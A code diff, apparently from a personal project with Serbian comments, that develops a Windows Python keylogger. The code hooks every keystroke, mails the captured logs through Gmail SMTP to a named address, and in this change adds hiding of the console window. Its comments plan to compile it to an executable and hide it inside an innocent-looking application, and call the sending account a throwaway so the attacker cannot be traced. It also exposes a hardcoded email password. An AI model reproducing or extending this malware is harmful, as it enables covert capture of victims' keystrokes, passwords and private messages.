@@ -1,7 +1,8 @@
 import pythoncom, pyHook
 import threading
 import smtplib
-import datetime,time
+import datetime, time
+import win32.win32console, win32.win32gui
 
 # Globalni bafer u koji cuvamo keylogove
 data = ''
@@ -10,14 +11,15 @@ data = ''
 class TimerClass(threading.Thread):
     def run(self):
             global data                                                     # Preuzimamo bafer za slanje na mail
-            ts = datetime.datetime.now()                                    # TIMESTAMP
+            ts = datetime.datetime.now()  
+            timestamp = ts.strftime("%b %d %Y %H:%M:%S")                    # TIMESTAMP
             SERVER = "smtp.gmail.com"                                       # Ovom linijom dajemo server na koji saljemo, u ovom slucaju koristicemo gmail, i protokol Simple Mail Transfer Protocol
             PORT = 587                                                      # SMTP Protokol za slanje maila podrazumevano je 587, mada postoji jos opcija
             USER="testtestera99@gmail.com"                                  # Mail adresa sa koje cemo poslati logove
             PASS="stolica123"                                               # Lozinka naloga, koristimo fresh nalog da se izbegne mogucnost pracenja, nalog ne sadrzi informacije o napadacu
             FROM = USER                                                     # FROM segment mejla jeste nas ulogovani nalog
             TO = "milovanovicmmilos99@gmail.com"                            # TO segment je mail na koji saljemo dump
-            SUBJECT = "Keylogger data @timestamp{" + str(ts) + "}:"         # Subject je naziv teme maila
+            SUBJECT = "Keylogger dump @timestamp{" + timestamp + "}:"       # Subject je naziv teme maila
             MESSAGE = data                                                  # MESSAGE jeste sam dump
             # Sledi formiranje maila koji je zapravo obican string, kako bi ispravno bili prikazani from, to, subject i body maila
             message = """\
@@ -54,11 +56,25 @@ def keyPressed(event):
 
     return True
 
-obj = pyHook.HookManager()
-obj.KeyDown = keyPressed
-obj.HookKeyboard()
-pythoncom.PumpMessages()
+def hideConsole():
+    #Skrivanje konzolnog prozora
+    window = win32.win32console.GetConsoleWindow()
+    win32.win32gui.ShowWindow(window, 0)
+
+def run():
+    hideConsole()
+
+    obj = pyHook.HookManager()
+    obj.KeyDown = keyPressed
+    obj.HookKeyboard()
+    pythoncom.PumpMessages()
+
+'''
+if __name__ == '__main__':
+    run()
+'''
 
 # 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA [x]
 # 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT [x]
-# 3. SAKRITI KEYLOGGER U JEDNOSTAVNU APLIKACIJU
+# 3. SAKRITI KONZOLNI PROZOR KEYLOGGERA                  [x]
+# 4. SAKRITI KEYLOGGER U JEDNOSTAVNU APLIKACIJU
